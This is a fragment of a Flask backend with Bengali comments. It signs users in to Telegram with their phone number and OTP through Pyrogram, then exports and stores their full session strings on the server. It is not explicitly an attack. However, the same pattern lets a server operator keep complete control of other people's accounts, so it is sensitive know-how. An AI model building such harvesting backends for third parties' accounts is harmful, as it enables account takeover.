import asyncio
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid

# ... (বাকি কনফিগারেশন একই থাকবে)

@app.route('/send-code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number is required"}), 400

    try:
        session_name = f"session_{phone.replace('+', '')}"
        client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
        
        # থ্রেডের জন্য নতুন ইভেন্ট লুপ তৈরি করে রান করা
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def main():
            await client.connect()
            sent_code = await client.send_code(phone)
            return sent_code

        sent_code = loop.run_until_complete(main())
        
        temp_clients[phone] = {
            "client": client,
            "loop": loop,
            "phone_code_hash": sent_code.phone_code_hash
        }
        
        return jsonify({"status": "success", "message": "OTP code sent to Telegram!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400

    if phone not in temp_clients:
        return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400

    user_data = temp_clients[phone]
    client = user_data["client"]
    loop = user_data["loop"]
    phone_code_hash = user_data["phone_code_hash"]

    try:
        async def verify_main():
            await client.sign_in(phone, phone_code_hash, code)
            session_string = await client.export_session_string()
            
            os.makedirs("sessions", exist_ok=True)
            session_filename = f"sessions/{phone.replace('+', '')}.session"
            with open(session_filename, "w") as f:
                f.write(session_string)
                
            await client.disconnect()

        loop.run_until_complete(verify_main())
        del temp_clients[phone]
        
        return jsonify({"status": "success", "message": "Session generated successfully!"})
        
    except PhoneCodeInvalid:
        return jsonify({"status": "error", "message": "Invalid OTP code!"}), 400
    except SessionPasswordNeeded:
        return jsonify({"status": "success", "message": "2FA Password required"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400
